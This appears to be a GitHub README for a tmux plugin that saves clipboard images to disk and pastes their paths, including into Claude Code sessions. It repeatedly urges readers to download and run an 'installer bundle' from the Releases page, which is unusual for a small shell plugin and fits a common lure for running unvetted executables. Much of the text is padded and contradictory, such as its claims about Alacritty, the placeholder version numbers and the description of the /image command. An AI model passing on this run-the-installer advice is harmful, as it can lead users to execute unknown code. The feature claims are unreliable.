https://github.com/tine-psd/tmux-paste-image/releases

# Tmux Paste Image: Save Clipboard Images & Paste Paths in Terminals

A tmux plugin that saves clipboard images as files and pastes their paths into tmux panes. It detects Claude Code sessions to use the /image command, solving Alacritty's lack of image pasting support. It works with X11 (xclip) and Wayland (wl-paste), and it provides configurable keybindings and save paths.

[![Release](https://img.shields.io/github/v/release/tine-psd/tmux-paste-image?style=for-the-badge&logo=github)](https://github.com/tine-psd/tmux-paste-image/releases)

Table of contents
- Why this project exists
- Key features at a glance
- Supported environments
- Getting started
- Installation and setup
- Configuration options
- Usage patterns
- Claude Code integration and the /image command
- X11 and Wayland specifics
- Troubleshooting
- Advanced workflows
- Security and privacy
- Accessibility considerations
- Contributing
- Roadmap
- FAQ
- Licensing

Why this project exists
Images are everywhere in modern workflows. When you work inside a terminal, you often need to bring an image into your workflow without leaving your tmux session. Alacritty, a popular terminal emulator, lacks built-in image paste support. This plugin addresses that gap by saving clipboard images as files and pasting their file paths into tmux panes. It supports both X11 and Wayland environments, making it versatile across Linux desktops and window managers.

If you want to jump straight to the latest release, you can visit the Releases page. The Releases page hosts prebuilt installer bundles and updates that you can download and run to set up the plugin quickly. For convenience, a colorful badge is provided below and links to the same page: [Release badge]. If the link ever changes or is slow to respond, you can still check the Releases section in your browser.

Key features at a glance
- Clipboard image handling
  - Save clipboard images as files automatically
  - Generate unique file names based on time and a hash to avoid collisions
  - Support for common image formats (png, jpg, webp, etc.)
- Path pasting into tmux
  - Paste the path of the saved image directly into the active tmux pane
  - Works with regular tmux panes and copy-mode paste scenarios
- Claude Code integration
  - Detect Claude Code sessions and automatically use the /image command for images
  - Smooth workflow for Claude Code users who paste images into their notes or chats
- Environment support
  - X11: uses xclip to fetch clipboard data
  - Wayland: uses wl-paste for clipboard access
- Configurability
  - Customizable keybindings
  - Configurable save directory and file naming pattern
  - Per-project or per-user tmux.conf options
- TPM-friendly
  - Easy installation via tmux plugin manager (TPM)
  - Works with standard TPM workflows
- Lightweight and robust
  - Small footprint and simple command surface
  - Clear error reporting and helpful debug messages when things go wrong

Supported environments
- Desktop environments running X11 or Wayland
- Terminal emulators that can access the system clipboard via xclip (X11) or wl-paste (Wayland)
- tmux versions that support plugins via TPM (tmux plugin manager)
- Claude Code users who rely on the /image command for image handling
- Users who need to paste image paths instead of raw images into tmux panes

Getting started
- Prerequisites
  - tmux installed (version 2.9 or later is recommended)
  - TPM (tmux plugin manager) installed and configured
  - xclip installed for X11 environments
  - wl-paste installed for Wayland environments
  - A writable directory to save images
- What you get after installing
  - A small, observable command that saves the clipboard image to disk
  - The path to the saved image is pasted into the current tmux pane
  - Optional Claude Code integration to streamline image handling in Claude Code sessions
- Quick start workflow
  - Copy an image to your clipboard
  - Trigger the plugin’s paste command (via your configured keybinding)
  - The plugin saves the image to disk and pastes the path into the active pane
  - Paste the path wherever you need it (notes, chats, scripts, documents)
- Getting help quickly
  - Run the plugin with a verbose or debug flag if you encounter issues
  - Check the log messages printed by the plugin in the tmux status line
  - See the Troubleshooting section for common problems and solutions

Installation and setup
- Installing via TPM (recommended)
  - Add the plugin to your TPM configuration
    - In your tmux.conf, add:
      - set -g @plugin 'tine-psd/tmux-paste-image'
  - Install the plugin using TPM:
    - Press the TPM default key (usually prefix + I) to fetch and install new plugins
  - Ensure your save directory exists or create it beforehand
  - Restart tmux or reload the configuration
- Direct installation (if you are not using TPM)
  - Clone the repository into your plugins directory
  - Point your tmux.conf to load the plugin from the local path
  - Bind a key to the paste command if not already bound
- Basic usage example
  - Bind a key in tmux to the paste-image command:
    - bind-key P run-shell "~/.tmux/plugins/tmux-paste-image/paste-image.sh"
  - Save an image from the clipboard, then paste the path into the current pane
- Quick configuration snippet (tmux.conf)
  - # Enable the plugin with TPM
    set -g @plugin 'tine-psd/tmux-paste-image'
  - # Optional: customize save path and naming
    set -g @tmxPasteImageSaveDir '~/.cache/tmux-paste-image'
    set -g @tmxPasteImageNamePattern '%Y-%m-%d_%H-%M-%S_%hash%'
  - # Optional: keybinding to paste image path
    bind-key P run-shell "~/.tmux/plugins/tmux-paste-image/paste-image.sh"

Configuration options
- Save directory
  - Choose a directory with ample space and good write permissions
  - Ideally, a per-user location like ~/.cache or ~/Pictures/tmux-paste
  - The plugin will create the directory if it does not exist
- File naming
  - A naming pattern helps avoid collisions and makes files easy to identify
  - Example: using date-time and a short hash
  - Pattern options can include:
    - %Y-%m-%d for the date
    - %H-%M-%S for the time
    - %sequence% or %hash% to ensure uniqueness
- Keybindings
  - Customize the binding to fit your tmux workflow
  - Typical options:
    - bind-key P to paste-image
    - Bind to a specific prefix-key sequence that works in your shell
- Clipboard backend
  - X11 users use xclip by default
  - Wayland users use wl-paste
  - If your setup uses a different clipboard tool, you can adapt the script to use it
- Claude Code detection
  - The plugin can detect Claude Code sessions
  - If Claude Code is detected, the plugin will issue the /image command automatically
- Logging and debugging
  - You can enable verbose logging for troubleshooting
  - Logs can be written to a file or sent to the tmux status line
- Per-project vs per-user settings
  - The plugin supports per-project tmux.conf overrides
  - You can place a local configuration file in your project to tailor the behavior

Usage patterns
- Basic paste flow
  - Copy an image to the clipboard
  - Invoke the paste command via the configured keybinding
  - The plugin saves the image as a file and pastes the file path in the active pane
- Pasting into Claude Code sessions
  - When the plugin detects a Claude Code session, it uses the /image command
  - This automates the interaction with Claude Code to ensure the image path is captured correctly
- Integrating with Alacritty
  - Alacritty can paste images via the clipboard, but many workflows require the file path
  - The plugin ensures consistent results by saving the image and pasting the path
- Pasting paths in scripts
  - You can trigger the paste action in a script to embed image paths automatically
  - Use tmux paste commands to capture the path in your script's input
- Multi-pane workflows
  - The plugin works across multiple tmux panes
  - You can paste image paths into a target pane while keeping your workflow in other panes
- Batch operations
  - You can copy multiple images to the clipboard in sequence
  - Each paste action will save a new file and paste the corresponding path

Claude Code integration and the /image command
- Claude Code compatibility
  - The plugin detects Claude Code sessions automatically
  - In Claude Code, the plugin uses the /image command to generate or retrieve the image
- Benefits
  - Reduces friction for users who rely on Claude Code for image-related tasks
  - Keeps your tmux workflow consistent with Claude Code’s expectations
- How it works under the hood
  - The plugin checks session context and, when Claude Code is active, calls the appropriate image command
  - It then pastes the resulting image path into the active pane
- Tips for Claude Code users
  - Ensure Claude Code is accessible from your environment
  - Keep Claude Code updated to benefit from improvements in image handling
  - If Claude Code updates change the behavior of image commands, adjust the plugin’s detection logic accordingly

X11 and Wayland specifics
- X11 (xclip)
  - The plugin uses xclip to grab the clipboard content
  - Requires xclip to be installed and in your PATH
  - Works well with most X11 window managers and desktops
- Wayland (wl-paste)
  - The plugin uses wl-paste for Wayland sessions
  - wl-paste must be installed and in your PATH
  - Works with popular Wayland compositors like Sway and others
- Handling edge cases
  - If the clipboard content is not an image, the plugin can fall back to a friendly message
  - You can customize error messages to suit your workflow
  - If file permissions or save directory issues arise, the plugin will report the problem clearly
- Performance considerations
  - Saving to disk is done quickly for typical clipboard image sizes
  - Pasting the path is a simple tmux operation, so it remains fast even in busy panes

Troubleshooting
- Common problems and fixes
  - Problem: No image saved after paste attempt
    - Check that the clipboard actually contains an image
    - Ensure the save directory exists and is writable
    - Verify that xclip or wl-paste is installed and accessible
  - Problem: The path is pasted but not the actual image
    - Confirm that the image was saved with a valid extension
    - Check the file naming pattern for any conflicts
  - Problem: Claude Code path fails to paste automatically
    - Ensure Claude Code is detected in the current session
    - Validate that the /image command is available and working in Claude Code
  - Problem: The plugin reports permission errors
    - Inspect the save directory permissions
    - Run tmux with a user that has write access to the save directory
- Debugging steps
  - Enable verbose logging in the plugin configuration
  - Review tmux status messages or log files for hints
  - Test clipboard commands outside tmux to confirm environment compatibility
- Common misconfigurations
  - Wrong path to the save directory
  - Missing clipboard tools in PATH
  - Incorrect plugin loading order in .tmux.conf
  - Conflicting keybindings that are already bound in your environment
- Recovery steps
  - Reinstall the plugin via TPM if you suspect plugin corruption
  - Reset the save directory to a known-good location
  - Revisit your tmux.conf to ensure there are no conflicting settings

Advanced workflows
- Per-project configuration
  - You can place project-specific tmux.conf fragments to customize behavior per project
  - Use project-level overrides for save paths, keybindings, and naming
- Scripting and automation
  - Integrate the paste workflow into scripts that generate documentation or reports
  - Use the pasted image path as input to other commands or pipelines
- Multi-user setups
  - In shared environments, you can configure per-user save paths to avoid conflicts
  - Each user can have their own keybindings without interfering with others
- Integrating with version control
  - Save image files in a repository-friendly directory
  - Track image history by naming files with timestamps
  - Use the path in commit messages or documentation
- Custom image processing
  - Before saving, you can run your own image processing tools (resize, compress) on clipboard data
  - Integrate with your preferred command-line utilities for image handling
- Image previews (optional)
  - If you want, you can extend the workflow to generate lightweight previews and store them alongside the image files
  - Preview generation can help you verify the content before pasting the path
- Accessibility and internationalization
  - Provide localized messages in your tmux status lines
  - Support non-English environments with clear, simple prompts

Security and privacy
- Data locality
  - Images are saved locally on your machine in the configured save directory
  - There is no automatic transmission of clipboard data to external services
- Permissions
  - Ensure the save directory is writable but not overly permissive
  - Consider restricting access to sensitive directories if you use the plugin in shared environments
- Handling sensitive images
  - If you copy sensitive images, you can implement a cleanup policy to delete old files periodically
  - The plugin can be extended to automatically purge files after a configurable period
- Least privilege principle
  - The plugin uses only the minimum set of tools necessary to operate (xclip/wl-paste, tmux commands)
  - Avoid loading extra processes unless you enable optional features

Accessibility considerations
- Keyboard navigation
  - The plugin follows your configured keybindings for paste actions
  - Ensure that bindings do not conflict with screen readers or other accessibility tools
- Clear messaging
  - When errors occur, messages are concise and informative
  - Status line updates provide quick feedback without overwhelming noise
- Visual cues
  - Use colorized status messages (where supported) to indicate success, warnings, or errors
  - Keep contrasts accessible for users with lower vision

Contributing
- How to contribute
  - Fork the repository
  - Create a feature branch for your changes
  - Open a pull request with a clear description of the feature or fix
- Development workflow
  - Run tests (if provided)
  - Manually verify both X11 and Wayland workflows
  - Validate Claude Code integration in a Claude Code session
- Coding standards
  - Follow the existing style and conventions
  - Include comments where necessary to improve clarity
- Reporting issues
  - Use a descriptive title
  - Include steps to reproduce, the environment, and the expected vs. actual behavior
  - Attach relevant logs or screenshots if possible
- Documentation contributions
  - Improve the README with clearer examples
  - Add new usage scenarios or edge cases
  - Update the FAQ with new questions as they arise

Roadmap
- Short-term goals
  - Improve detection accuracy for Claude Code sessions
  - Expand compatibility with additional clipboard backends
  - Add preview generation for saved images
- Medium-term goals
  - Provide an option to auto-delete old files after a grace period
  - Add per-workspace configuration profiles
  - Integrate with popular note-taking tools to paste image paths directly
- Long-term goals
  - Cross-platform parity with non-Linux terminals
  - More robust error handling and user feedback
  - Community-driven feature matrix and voting mechanism

FAQ
- What is the main purpose of this plugin?
  - It saves clipboard images as files and pastes their paths into tmux panes, solving image pasting gaps in certain terminals and environments.
- Which environments does it support?
  - It supports X11 (xclip) and Wayland (wl-paste), with Claude Code session detection for /image.
- How do I install it?
  - Use TPM to install the plugin, or install manually by cloning and loading from your plugin directory. See the Installation section for details.
- How do I customize the save location?
  - Use the Save directory option in the configuration. Ensure the directory exists and has the right permissions.
- What if the link to the Releases page is slow or broken?
  - Check the Releases page directly in your browser or use the repository’s Releases section to find the latest installer and instructions.
- Is this project secure?
  - The plugin operates locally and only uses clipboard data and local files. Use standard security practices for your system.

Changelog (high level)
- v0.x.y
  - Initial release with core functionality: image saving, path pasting, and Claude Code detection
- v0.x.y+1
  - Added Wayland support via wl-paste
  - Improved X11 compatibility with xclip
- v0.x.y+2
  - Claude Code detection enhancements
  - Better error handling and user feedback
- v0.x.y+3
  - TPM-friendly installation improvements
  - Per-user configuration options

Releases and downloads
- The Releases page hosts installer bundles and versioned releases
- Access the latest release for a quick setup
- If the link to the Releases page is not working, visit the Releases section in your browser to locate the latest installer and read the installation notes

Get the latest release
- Download the installer bundle and run it to set up the plugin
- The installation script will configure your tmux environment and set up default keybindings
- After installation, reload tmux or restart the session to apply changes
- You can also run the installer manually if you prefer a custom installation path
- If you need an extra layer of safety, back up your tmux.conf and save directory first
- For quick access to the official page, visit the Releases area here: https://github.com/tine-psd/tmux-paste-image/releases

Usage examples
- Example 1: Basic usage in a standard tmux pane
  - Copy an image to the clipboard
  - Press your paste keybinding (for example, Prefix + P)
  - The plugin saves the image and pastes the path into the pane
- Example 2: Claude Code integration flow
  - While working in Claude Code, trigger the paste action
  - The plugin detects Claude Code and uses the /image command to handle the image
  - The path is pasted into the active tmux pane for easy reference
- Example 3: Scripting and automation
  - You can embed the paste action in scripts to automatically insert image paths into documentation
  - Use the path in build scripts or notes generation
- Example 4: Working with Alacritty
  - Alacritty users can paste images as files and paste the path, ensuring consistency
  - The plugin acts as a bridge between clipboard content and tmux workflows

Design goals and philosophy
- Simplicity
  - The core flow is straightforward: copy, paste, save as file, paste path
- Reliability
  - Clear error messages and robust handling of different clipboard backends
- Extensibility
  - The plugin is built to be extended with new backends, additional naming options, and new integrations
- Privacy
  - All image data remains on the local system unless you choose to back it up or share it

Community and support
- Community expectations
  - Be respectful and constructive in any discussions
  - Share reproducible steps for issues
  - Propose enhancements with clear use cases and expectations
- Support channels
  - Issues and discussions are hosted on the repository
  - For urgent help, you can reference the Releases page and the plugin’s documentation
- Documentation updates
  - Documentation evolves with the project
  - Check the README and Wiki for new features and changes

License
- This project is distributed under a permissive license that encourages use and adaptation
- See the LICENSE file in the repository for full terms

Examples of commands you might use
- tmux command to load the plugin via TPM
  - In tmux.conf: set -g @plugin 'tine-psd/tmux-paste-image'
  - In tmux: Prefix + I to install plugins
- Example paste command binding
  - bind-key P run-shell "~/.tmux/plugins/tmux-paste-image/paste-image.sh"
- File naming pattern example
  - set -g @tmxPasteImageNamePattern '%Y-%m-%d_%H-%M-%S_%hash%.png'
- Save directory example
  - set -g @tmxPasteImageSaveDir '~/.cache/tmux-paste-image'

Visuals and media
- Demo screenshots
  - A screenshot of a tmux pane showing the pasted path after an image save
  - A screenshot of Claude Code integration showing /image usage at work
- Emoji usage
  - 🧭 Quick setup
  - 🧰 Tools and dependencies
  - 🗂️ File management
  - 🖼️ Image handling
  - 🚀 Performance and reliability
- Image placeholders
  - If you want to embed images, use placeholder visuals representing terminals and images

Notes on formatting and presentation
- The documentation is structured to be easy to skim, with dense details for those who want to dive deeper
- Each section uses clear, direct language and concrete examples
- Commands and code-like elements are formatted with inline code syntax for easy copying
- No heavy formatting blocks; the focus remains on clarity and usefulness

Potential future enhancements
- Add support for additional clipboard backends beyond xclip and wl-paste
- Expand Claude Code detection to cover more code editors and snippets
- Provide a GUI companion for configuration in supported desktop environments
- Introduce a plugin-wide test suite to ensure stability across tmux and shell environments

Final notes
- This repository provides a practical solution for working with clipboard images in tmux
- It emphasizes reliability, simple workflows, and compatibility across common Linux environments
- If you want to customize the behavior, the configuration sections are designed to be approachable and flexible

Releases and downloads (reiterated)
- The Releases page hosts installer bundles and versioned releases
- Access the latest release for a quick setup
- If the link to the Releases page is not working, visit the Releases section in your browser to locate the latest installer and read the installation notes

Get the latest release (reiterated)
- Download the installer bundle and run it to set up the plugin
- The installation script will configure your tmux environment and set up default keybindings
- After installation, reload tmux or restart the session to apply changes
- You can also run the installer manually if you prefer a custom installation path
- For quick access to the official page, visit the Releases area here: https://github.com/tine-psd/tmux-paste-image/releases

End of documentation.